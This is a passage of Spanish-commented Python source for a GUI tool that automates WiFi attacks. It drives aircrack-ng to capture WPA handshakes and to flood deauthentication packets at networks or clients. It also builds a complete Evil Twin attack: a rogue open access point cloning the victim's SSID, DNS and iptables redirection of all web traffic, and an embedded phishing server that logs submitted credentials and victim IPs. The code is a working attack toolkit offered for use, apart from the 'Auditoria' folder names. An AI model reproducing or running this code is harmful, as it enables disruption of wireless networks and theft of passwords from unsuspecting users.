        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        return f"/tmp/{prefijo}_{timestamp}"

    def _wifi_captura_handshake(self):
        # Paso 1: Seleccionar interfaz
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ctk.CTkLabel(self.main_frame, text="CAPTURA HANDSHAKE - Selecciona Interfaz", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        interfaces = self.obtener_interfaces_red()
        if not interfaces:
            ctk.CTkLabel(self.main_frame, text="No hay interfaces.").pack()
            return
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                         command=lambda i=iface: self._wifi_escanear_redes_handshake(i)).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _wifi_escanear_redes_handshake(self, iface):
        self.wifi_state = {"iface": iface, "mon_iface": None}
        # Activar modo monitor
        self.escribir_consola(f"[*] Activando modo monitor en {iface}...")
        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
        os.system(f"sudo airmon-ng start {iface} >/dev/null 2>&1")
        if os.path.exists(f"/sys/class/net/{iface}mon"):
            self.wifi_state["mon_iface"] = f"{iface}mon"
        else:
            self.wifi_state["mon_iface"] = iface
        mon = self.wifi_state["mon_iface"]
        self.escribir_consola(f"[*] Escaneando con {mon} durante 15 segundos...")
        
        # Escaneo con archivo temporal dinámico
        scan_prefix = self._generar_nombre_temporal("wifi_handshake")
        self.wifi_state["scan_file"] = scan_prefix  # Guardar para posible limpieza
        
        def escanear():
            os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
            redes = []
            try:
                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                    contenido = f.read()
                    partes = contenido.split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), 
                                         "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
            except Exception as e:
                self.escribir_consola(f"[!] Error escaneo: {e}")
            finally:
                # Limpiar archivos temporales
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{scan_prefix}{ext}")
                    except:
                        pass
            self.after(0, lambda: self._wifi_mostrar_redes_handshake(redes))
        threading.Thread(target=escanear, daemon=True).start()
        self.escribir_consola("[*] Escaneando, espera...")

    def _wifi_mostrar_redes_handshake(self, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_captura_handshake)
        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED OBJETIVO", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        if not redes:
            ctk.CTkLabel(self.main_frame, text="No se encontraron redes.").pack()
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for red in redes:
            texto = f"{red['essid']} (CH:{red['ch']} | {red['bssid']})"
            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda r=red: self._wifi_seleccionar_cliente_handshake(r))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _wifi_seleccionar_cliente_handshake(self, red):
        self.wifi_state["target"] = red
        # Escanear clientes asociados
        mon = self.wifi_state["mon_iface"]
        scan_prefix = self._generar_nombre_temporal("wifi_clients")
        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]:
                            clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass
        
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))  # simplificado
        ctk.CTkLabel(self.main_frame, text=f"CLIENTES EN {red['essid']}", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        # Opción broadcast
        ctk.CTkButton(frame, text="Todos (Broadcast)", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
                     command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF")).pack(fill="x", pady=5)
        for mac in clientes:
            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                         command=lambda m=mac: self._wifi_iniciar_ataque_handshake(m)).pack(fill="x", pady=3)
        self.mostrar_consola()

    def _wifi_iniciar_ataque_handshake(self, cliente_mac):
        red = self.wifi_state["target"]
        mon = self.wifi_state["mon_iface"]
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.join(BASE_DIR_WIFI, f"Auditoria-{timestamp}")
        os.makedirs(session_dir, exist_ok=True)
        
        # Iniciar airodump en segundo plano
        cmd_airodump = f"sudo airodump-ng --channel {red['ch']} --bssid {red['bssid']} -w {session_dir}/Captura {mon} >/dev/null 2>&1 &"
        os.system(cmd_airodump)
        time.sleep(2)
        # Enviar deauth
        cmd_deauth = f"sudo aireplay-ng -0 10 -a {red['bssid']} -c {cliente_mac} {mon}"
        self.ejecutar_comando(cmd_deauth, callback_after=lambda: self.escribir_consola(f"[+] Captura guardada en {session_dir}"))
        self.escribir_consola("[*] Ataque en curso. Espera handshake...")

    # ==========================================
    # MÉTODOS DE EVIL TWIN (MODIFICADOS CON MANEJO DE PROCESOS)
    # ==========================================
    def _wifi_evil_twin(self):
        """Inicia el flujo de Evil Twin: selección de interfaz AP"""
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ctk.CTkLabel(self.main_frame, text="EVIL TWIN - Selecciona Interfaz para AP Malicioso",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        interfaces = self.obtener_interfaces_red()
        if len(interfaces) < 2:
            ctk.CTkLabel(self.main_frame, text="Se necesitan al menos 2 interfaces WiFi (una para AP y otra para Deauth).").pack()
            return
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=f"AP: {iface}", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER,
                          command=lambda i=iface: self._evil_twin_select_deauth(i)).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _evil_twin_select_deauth(self, ap_iface):
        """Guarda interfaz AP y solicita interfaz para Deauth"""
        self.wifi_state["ap_iface"] = ap_iface
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_evil_twin)
        ctk.CTkLabel(self.main_frame, text="Selecciona Interfaz para Desautenticación",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        interfaces = [i for i in self.obtener_interfaces_red() if i != ap_iface]
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER,
                          command=lambda i=iface: self._evil_twin_escanear_redes(i)).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _evil_twin_escanear_redes(self, deauth_iface):
        """Escanea redes WiFi usando la interfaz de deauth en modo monitor"""
        self.wifi_state["deauth_iface"] = deauth_iface
        self.escribir_consola(f"[*] Preparando {deauth_iface} para escaneo...")
        # Activar modo monitor
        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
        os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
        mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
        self.wifi_state["mon_deauth"] = mon

        self.escribir_consola(f"[*] Escaneando redes con {mon} durante 15 segundos...")
        scan_prefix = self._generar_nombre_temporal("evil_scan")
        self.wifi_state["scan_file"] = scan_prefix
        # Escaneo en segundo plano
        def escanear():
            os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
            redes = []
            try:
                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                    contenido = f.read()
                    partes = contenido.split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            redes.append({
                                "bssid": r[0].strip(),
                                "ch": r[3].strip(),
                                "essid": r[13].strip() if r[13].strip() else "<Oculta>"
                            })
            except Exception as e:
                self.escribir_consola(f"[!] Error al leer escaneo: {e}")
            finally:
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{scan_prefix}{ext}")
                    except:
                        pass
            self.after(0, lambda: self._evil_twin_mostrar_redes(redes))
        threading.Thread(target=escanear, daemon=True).start()
        self.mostrar_consola()
        self.escribir_consola("[*] Escaneando, espera...")

    def _evil_twin_mostrar_redes(self, redes):
        """Muestra las redes encontradas para seleccionar objetivo"""
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_evil_twin)
        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED OBJETIVO",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        if not redes:
            ctk.CTkLabel(self.main_frame, text="No se encontraron redes WiFi.").pack()
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for red in redes:
            texto = f"{red['essid']} (CH:{red['ch']} | {red['bssid']})"
            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                                command=lambda r=red: self._evil_twin_seleccionar_portal(r))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _evil_twin_seleccionar_portal(self, red):
        """Guarda red objetivo y permite elegir portal cautivo"""
        self.wifi_state["target"] = red
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_mostrar_redes([red]))  # simplificado
        ctk.CTkLabel(self.main_frame, text="SELECCIONA PORTAL CAUTIVO",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
        os.makedirs(portals_dir, exist_ok=True)
        portales = [d for d in os.listdir(portals_dir) if os.path.isdir(os.path.join(portals_dir, d))]
        if not portales:
            ctk.CTkLabel(self.main_frame, text="No hay portales en 'evil_portals/'. Crea una subcarpeta con index.html").pack()
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for portal in sorted(portales):
            ruta_portal = os.path.join(portals_dir, portal)
            if os.path.isfile(os.path.join(ruta_portal, "index.html")):
                btn = ctk.CTkButton(frame, text=portal, fg_color=COLOR_BOTON_ROJO,
                                    hover_color=COLOR_BOTON_HOVER,
                                    command=lambda p=portal: self._evil_twin_seleccionar_deauth_mode(red, p))
                btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _evil_twin_seleccionar_deauth_mode(self, red, portal):
        """Elige modo de desautenticación (broadcast o dirigido)"""
        self.wifi_state["portal_name"] = portal
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_portal(red))
        ctk.CTkLabel(self.main_frame, text="MODO DE DESAUTENTICACIÓN",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        ctk.CTkButton(self.main_frame, text="Broadcast (Desconectar todos - Recomendado)",
                      fg_color=COLOR_BOTON_PELIGRO,
                      command=lambda: self._evil_twin_ejecutar(red, portal, "broadcast")).pack(fill="x", padx=40, pady=10)
        ctk.CTkButton(self.main_frame, text="Dirigido (Elegir cliente específico)",
                      fg_color=COLOR_BOTON_ROJO,
                      command=lambda: self._evil_twin_escanear_clientes(red, portal)).pack(fill="x", padx=40, pady=10)
        self.mostrar_consola()

    def _evil_twin_escanear_clientes(self, red, portal):
        """Escanea clientes asociados a la red objetivo para deauth dirigido"""
        mon = self.wifi_state.get("mon_deauth")
        if not mon:
            self.escribir_consola("[!] No se encontró interfaz monitor. Reintenta.")
            return
        self.escribir_consola(f"[*] Escaneando clientes en {red['essid']}...")
        scan_prefix = self._generar_nombre_temporal("evil_clients")
        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]:
                            clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
        ctk.CTkLabel(self.main_frame, text=f"CLIENTES EN {red['essid']}",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        if not clientes:
            ctk.CTkLabel(self.main_frame, text="No se detectaron clientes. Usa modo Broadcast.").pack()
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for mac in clientes:
            btn = ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                                command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
        """Configura y lanza el ataque Evil Twin completo con control de procesos."""
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
        os.makedirs(session_dir, exist_ok=True)

        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ctk.CTkLabel(self.main_frame, text="EVIL TWIN EN EJECUCIÓN",
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
        info_text = f"AP: {self.wifi_state['ap_iface']} | Objetivo: {red['essid']} | Portal: {portal}"
        ctk.CTkLabel(self.main_frame, text=info_text).pack()
        ctk.CTkButton(self.main_frame, text="DETENER ATAQUE", fg_color=COLOR_BOTON_PELIGRO,
                      command=self._evil_twin_detener).pack(pady=10)
        self.mostrar_consola()
        self.escribir_consola(f"[!] Iniciando Evil Twin contra {red['essid']} ({red['bssid']})")
        self.escribir_consola(f"[*] Portal: {portal} | Modo Deauth: {deauth_mode}")
        self.escribir_consola(f"[*] Resultados en: {session_dir}")

        self.evil_twin_stop = False

        def ataque():
            # Limpiar procesos previos (usar terminate en lugar de pkill)
            self._evil_twin_limpiar_procesos()

            ap_iface = self.wifi_state["ap_iface"]
            deauth_iface = self.wifi_state.get("deauth_iface")
            mon_deauth = self.wifi_state.get("mon_deauth")

            if not mon_deauth:
                # Activar modo monitor en interfaz de deauth
                os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
                mon_deauth = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                self.wifi_state["mon_deauth"] = mon_deauth

            # Copiar portal a /tmp (usar timestamp para evitar colisiones)
            portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
            os.makedirs(tmp_web, exist_ok=True)
            os.system(f"cp -r {portals_dir}/{portal}/* {tmp_web}/ 2>/dev/null")

            # Script de captura
            cred_log = os.path.join(session_dir, "credentials.log")
            capture_script = f'''#!/usr/bin/env python3
import http.server, urllib.parse, os, socketserver
from datetime import datetime
LOG = "{cred_log}"

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.path = "/index.html"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(data)
        with open(LOG, "a") as f:
            f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} Data:{{params}}\\n")
        self.send_response(302)
        self.send_header("Location", "/success.html")
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    os.chdir("{tmp_web}")
    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd:
        httpd.serve_forever()
'''
            with open(f"{tmp_web}/capture.py", "w") as f:
                f.write(capture_script)

            if not os.path.exists(f"{tmp_web}/success.html"):
                with open(f"{tmp_web}/success.html", "w") as f:
                    f.write('<html><body><h2>Conectado</h2><p>Redirigiendo...</p></body></html>')

            # Habilitar IP forwarding
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)

            # Configurar hostapd
            hostapd_conf = f"""interface={ap_iface}
driver=nl80211
ssid={red['essid']}
hw_mode=g
channel={int(red['ch'])}
macaddr_acl=0
auth_algs=1
wpa=0
ignore_broadcast_ssid=0
"""
            with open("/tmp/hostapd_evil.conf", "w") as f:
                f.write(hostapd_conf)

            self.escribir_consola("[*] Iniciando hostapd...")
            self.evil_twin_procs['hostapd'] = subprocess.Popen(
                ["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(3)

            # Configurar IP en interfaz AP
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)

            # Configurar dnsmasq
            dnsmasq_conf = f"""interface={ap_iface}
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
no-hosts
no-resolv
"""
            with open("/tmp/dnsmasq_evil.conf", "w") as f:
                f.write(dnsmasq_conf)
            self.escribir_consola("[*] Iniciando dnsmasq...")
            self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)

            # Configurar iptables
            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)

            # Iniciar servidor de captura
            self.escribir_consola("[*] Iniciando servidor de phishing en puerto 80...")
            self.evil_twin_procs['capture'] = subprocess.Popen(
                ["sudo", "python3", f"{tmp_web}/capture.py"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(1)

            # Iniciar desautenticación
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
            if deauth_mode == "directed" and cliente_mac:
                deauth_cmd.extend(["-c", cliente_mac])
            deauth_cmd.append(mon_deauth)
            self.escribir_consola(f"[*] Iniciando desautenticación continua: {' '.join(deauth_cmd)}")
            self.evil_twin_procs['deauth'] = subprocess.Popen(
                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            # Monitorear credenciales
            self.escribir_consola("[!] ATAQUE ACTIVO. Presiona 'DETENER ATAQUE' para finalizar.")
            last_lines = 0
            while not self.evil_twin_stop:
                time.sleep(2)
                if os.path.exists(cred_log):
                    with open(cred_log, "r") as f:
                        lines = f.readlines()
                        if len(lines) > last_lines:
                            for line in lines[last_lines:]:
                                self.escribir_consola(f"[+] Credencial: {line.strip()}")
                            last_lines = len(lines)

            # Detener procesos de manera controlada
            self.escribir_consola("[*] Deteniendo ataque...")
            self._evil_twin_detener_procesos()
            self._evil_twin_limpiar_iptables(ap_iface)
            self.escribir_consola("[+] Evil Twin detenido y limpiado.")
            self.after(0, lambda: ctk.CTkLabel(self.main_frame, text="Ataque finalizado.", text_color="green").pack())

        self.evil_twin_thread = threading.Thread(target=ataque, daemon=True)
        self.evil_twin_thread.start()

    def _evil_twin_detener(self):
        self.evil_twin_stop = True
        self.escribir_consola("[!] Señal de detención enviada...")

    def _evil_twin_detener_procesos(self):
        """Termina los procesos almacenados de manera controlada."""
        for nombre, proc in self.evil_twin_procs.items():
            if proc is not None:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except:
                    proc.kill()
                self.evil_twin_procs[nombre] = None

    def _evil_twin_limpiar_procesos(self):
        """Limpia procesos previos (por si acaso)."""
        self._evil_twin_detener_procesos()
        # Matar cualquier instancia residual (mejor que pkill genérico)
        os.system("sudo pkill -f 'hostapd.*evil' 2>/dev/null")
        os.system("sudo pkill -f 'dnsmasq.*evil' 2>/dev/null")
        os.system("sudo pkill -f 'capture.py' 2>/dev/null")
        os.system("sudo pkill -f 'aireplay-ng' 2>/dev/null")

    def _evil_twin_limpiar_iptables(self, ap_iface):
        """Restaura iptables y limpia configuraciones."""
        subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
        if ap_iface:
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)

    # ==========================================
    # FIN DE MÉTODOS EVIL TWIN
    # ==========================================

    def _wifi_deauth(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ctk.CTkLabel(self.main_frame, text="DESAUTENTICACIÓN - Selecciona Interfaz", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        interfaces = self.obtener_interfaces_red()
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                         command=lambda i=iface: self._deauth_escanear(i)).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _deauth_escanear(self, iface):
        self.wifi_state = {"iface": iface}
        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
        os.system(f"sudo airmon-ng start {iface} >/dev/null 2>&1")
        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
        self.wifi_state["mon_iface"] = mon
        self.escribir_consola(f"[*] Escaneando con {mon}...")
        scan_prefix = self._generar_nombre_temporal("deauth_scan")
        os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
        redes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                for linea in f.read().split("\n")[2:]:
                    r = linea.split(",")
                    if len(r) >= 14 and ":" in r[0]:
                        redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass
        self.after(0, lambda: self._deauth_mostrar_redes(redes))

    def _deauth_mostrar_redes(self, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for red in redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda r=red: self._deauth_seleccionar_modo(r))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _deauth_seleccionar_modo(self, red):
        self.wifi_state["target"] = red
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ctk.CTkLabel(self.main_frame, text="MODO DE ATAQUE", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        ctk.CTkButton(self.main_frame, text="Broadcast (Todos)", fg_color=COLOR_BOTON_PELIGRO,
                     command=lambda: self._deauth_ejecutar("FF:FF:FF:FF:FF:FF")).pack(fill="x", padx=40, pady=10)
        # Opción unicast: escanear clientes
        ctk.CTkButton(self.main_frame, text="Cliente específico", fg_color=COLOR_BOTON_ROJO,
                     command=lambda: self._deauth_escanear_clientes(red)).pack(fill="x", padx=40, pady=10)
        self.mostrar_consola()

    def _deauth_escanear_clientes(self, red):
        mon = self.wifi_state["mon_iface"]
        scan_prefix = self._generar_nombre_temporal("deauth_clients")
        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]:
                            clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
        ctk.CTkLabel(self.main_frame, text="SELECCIONA CLIENTE", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        if not clientes:
            ctk.CTkLabel(self.main_frame, text="No hay clientes. Usa Broadcast.").pack()
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for mac in clientes:
            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                         command=lambda m=mac: self._deauth_ejecutar(m)).pack(fill="x", pady=3)
        self.mostrar_consola()

    def _deauth_ejecutar(self, cliente):
        red = self.wifi_state["target"]
        mon = self.wifi_state["mon_iface"]
        # Seleccionar intensidad
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ctk.CTkLabel(self.main_frame, text="INTENSIDAD", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        opciones = [("Continuo (0)", "0"), ("1 ráfaga (5)", "5"), ("3 ráfagas (15)", "15")]
        for texto, count in opciones:
            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO,
                         command=lambda c=count: self.ejecutar_comando(
                             f"sudo aireplay-ng --deauth {c} -a {red['bssid']} -c {cliente} {mon}"
                         )).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _wifi_explorar_handshakes(self):
        self._mostrar_explorador_generico(BASE_DIR_WIFI, "CAPTURAS HANDSHAKE", self.show_wifi_menu)

    def _wifi_explorar_evil(self):
        self._mostrar_explorador_generico(BASE_DIR_EVIL, "RESULTADOS EVIL TWIN", self.show_wifi_menu)

    def _mostrar_explorador_generico(self, base_dir, titulo, callback_volver):
        self.limpiar_main_frame()
        self.agregar_boton_atras(callback_volver)
        ctk.CTkLabel(self.main_frame, text=titulo, font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
        carpetas = sorted([d for d in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, d))], reverse=True)
        if not carpetas:
            ctk.CTkLabel(self.main_frame, text="No hay resultados.").pack(pady=20)
            return
